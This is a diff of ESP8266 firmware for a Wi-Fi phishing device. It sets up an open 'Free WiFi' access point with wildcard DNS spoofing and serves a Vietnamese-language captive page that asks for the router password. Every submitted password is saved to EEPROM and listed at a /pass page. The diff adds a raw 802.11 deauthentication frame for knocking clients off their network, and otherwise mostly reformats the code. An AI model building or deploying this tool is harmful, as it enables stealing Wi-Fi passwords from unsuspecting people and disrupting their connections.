@@ -3,12 +3,32 @@
 
 // Libraries
 #include <ESP8266WiFi.h>
-#include <DNSServer.h> 
+#include <DNSServer.h>
 #include <ESP8266WebServer.h>
 #include <EEPROM.h>
 
+/*
+ * The packet has this structure:
+ * 0-1:   type (C0 is deauth)
+ * 2-3:   duration
+ * 4-9:   receiver address (broadcast)
+ * 10-15: source address
+ * 16-21: BSSID
+ * 22-23: sequence number
+ * 24-25: reason code (1 is unspecified reason)
+ */
+
+uint8_t packet[26] = {
+    0xC0, 0x00,
+    0x00, 0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00,
+    0x01, 0x00};
+
 // Default SSID name
-const char* SSID_NAME = "Free WiFi";
+const char *SSID_NAME = "Free WiFi";
 
 // Default main strings
 #define SUBTITLE "Thông tin bộ định tuyến."
@@ -34,44 +54,56 @@ int initialCheckLocation = 20; // Location to check whether the ESP is running f
 int passStart = 30;            // Starting location in EEPROM to save password.
 int passEnd = passStart;       // Ending location in EEPROM to save password.
 
+unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
+DNSServer dnsServer;
+ESP8266WebServer webServer(80);
 
-unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0;
-DNSServer dnsServer; ESP8266WebServer webServer(80);
-
-String input(String argName) {
+String input(String argName)
+{
   String a = webServer.arg(argName);
-  a.replace("<","&lt;");a.replace(">","&gt;");
-  a.substring(0,200); return a; }
+  a.replace("<", "&lt;");
+  a.replace(">", "&gt;");
+  a.substring(0, 200);
+  return a;
+}
 
-String footer() { 
+String footer()
+{
   return "</div><div class=q><a>&#169; Trung Trần.</a></div>";
 }
 
-String header(String t) {
+String header(String t)
+{
   String a = String(currentSSID);
-  String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
-    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
-    "div { padding: 0.5em; }"
-    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
-    "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
-    "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
-    "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
-    "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
-    "textarea { width: 100%; }";
+  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
+               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
+               "div { padding: 0.5em; }"
+               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
+               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
+               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
+               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
+               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
+               "textarea { width: 100%; }";
   String h = "<!DOCTYPE html><html>"
-    "<head><title>" + a + " :: " + t + "</title>"
-    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
-    "<style>" + CSS + "</style>"
-    "<meta charset=\"UTF-8\"></head>"
-    "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
-  return h; }
-
-String index() {
-  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post><label>Nhập mật khẩu Wifi:</label>"+
-    "<input type=password name=m></input><input type=submit value=\"Bắt đầu\"></form>" + footer();
+             "<head><title>" +
+             a + " :: " + t + "</title>"
+                              "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
+                              "<style>" +
+             CSS + "</style>"
+                   "<meta charset=\"UTF-8\"></head>"
+                   "<body><nav><b>" +
+             a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
+  return h;
 }
 
-String posted() {
+String index()
+{
+  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post><label>Nhập mật khẩu Wifi:</label>" +
+         "<input type=password name=m></input><input type=submit value=\"Bắt đầu\"></form>" + footer();
+}
+
+String posted()
+{
   String pass = input("m");
   pass = "<li><b>" + pass + "</li></b>"; // Adding password in a ordered list.
   allPass += pass;                       // Updating the full passwords.
@@ -88,18 +120,23 @@ String posted() {
   return header(POST_TITLE) + POST_BODY + footer();
 }
 
-String pass() {
+String pass()
+{
   return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Quay lại chỉ mục</a></p><p><a style=\"color:blue\" href=/clear>Dọn dẹp mật khẩu</a></p></center>" + footer();
 }
 
-String ssid() {
-  return header("Thay đổi SSID") + "<p>Bạn có thể thay đổi tên SSID.Sau khi ấn vào nút \"Thay đổi SSID\" bạn sẽ mất kết nối và kết nối lại với SSID mới.</p>" + "<form action=/postSSID method=post><label>Tên SSID mới:</label>"+
-    "<input type=text name=s></input><input type=submit value=\"Thay đổi SSID\"></form>" + footer();
+String ssid()
+{
+  return header("Thay đổi SSID") + "<p>Bạn có thể thay đổi tên SSID.Sau khi ấn vào nút \"Thay đổi SSID\" bạn sẽ mất kết nối và kết nối lại với SSID mới.</p>" + "<form action=/postSSID method=post><label>Tên SSID mới:</label>" +
+         "<input type=text name=s></input><input type=submit value=\"Thay đổi SSID\"></form>" + footer();
 }
 
-String postedSSID() {
-  String postedSSID = input("s"); newSSID="<li><b>" + postedSSID + "</b></li>";
-  for (int i = 0; i < postedSSID.length(); ++i) {
+String postedSSID()
+{
+  String postedSSID = input("s");
+  newSSID = "<li><b>" + postedSSID + "</b></li>";
+  for (int i = 0; i < postedSSID.length(); ++i)
+  {
     EEPROM.write(i, postedSSID[i]);
   }
   EEPROM.write(postedSSID.length(), '\0');
@@ -108,7 +145,8 @@ String postedSSID() {
   return newSSID;
 }
 
-String clear() {
+String clear()
+{
   allPass = "";
   passEnd = passStart; // Setting the password end location -> starting position.
   EEPROM.write(passEnd, '\0');
@@ -116,7 +154,8 @@ String clear() {
   return header(CLEAR_TITLE) + "<div><p>Mật khẩu đã được dọn dẹp.</div></p><center><a style=\"color:blue\" href=/>Quay lại chỉ mục</a></center>" + footer();
 }
 
-void BLINK() { // The built-in LED will blink 5 times after a password is posted.
+void BLINK()
+{ // The built-in LED will blink 5 times after a password is posted.
   for (int counter = 0; counter < 10; counter++)
   {
     // For blinking the LED.
@@ -125,10 +164,11 @@ void BLINK() { // The built-in LED will blink 5 times after a password is posted
   }
 }
 
-void setup() {
+void setup()
+{
   // Serial begin
   Serial.begin(115200);
-  
+
   bootTime = lastActivity = millis();
   EEPROM.begin(512);
   delay(10);
@@ -151,11 +191,12 @@ void setup() {
       break;
     }
   }
-  
+
   // Read EEPROM SSID
   String ESSID;
   int i = 0;
-  while (EEPROM.read(i) != '\0') {
+  while (EEPROM.read(i) != '\0')
+  {
     ESSID += char(EEPROM.read(i));
     i++;
   }
@@ -166,7 +207,7 @@ void setup() {
     allPass += char(EEPROM.read(passEnd)); // Reading the store password in EEPROM.
     passEnd++;                             // Updating the end location of password in EEPROM.
   }
-  
+
   WiFi.mode(WIFI_AP);
   WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
 
@@ -175,16 +216,22 @@ void setup() {
 
   Serial.print("Current SSID: ");
   Serial.print(currentSSID);
-  WiFi.softAP(currentSSID);  
+  WiFi.softAP(currentSSID);
 
   // Start webserver
   dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only for HTTP)
-  webServer.on("/post",[]() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
-  webServer.on("/ssid",[]() { webServer.send(HTTP_CODE, "text/html", ssid()); });
-  webServer.on("/postSSID",[]() { webServer.send(HTTP_CODE, "text/html", postedSSID()); });
-  webServer.on("/pass",[]() { webServer.send(HTTP_CODE, "text/html", pass()); });
-  webServer.on("/clear",[]() { webServer.send(HTTP_CODE, "text/html", clear()); });
-  webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
+  webServer.on("/post", []()
+               { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
+  webServer.on("/ssid", []()
+               { webServer.send(HTTP_CODE, "text/html", ssid()); });
+  webServer.on("/postSSID", []()
+               { webServer.send(HTTP_CODE, "text/html", postedSSID()); });
+  webServer.on("/pass", []()
+               { webServer.send(HTTP_CODE, "text/html", pass()); });
+  webServer.on("/clear", []()
+               { webServer.send(HTTP_CODE, "text/html", clear()); });
+  webServer.onNotFound([]()
+                       { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
   webServer.begin();
 
   // Enable the built-in LED
@@ -192,7 +239,12 @@ void setup() {
   digitalWrite(BUILTIN_LED, HIGH);
 }
 
-
-void loop() { 
-  if ((millis() - lastTick) > TICK_TIMER) {lastTick = millis();} 
-dnsServer.processNextRequest(); webServer.handleClient(); }
+void loop()
+{
+  if ((millis() - lastTick) > TICK_TIMER)
+  {
+    lastTick = millis();
+  }
+  dnsServer.processNextRequest();
+  webServer.handleClient();
+}
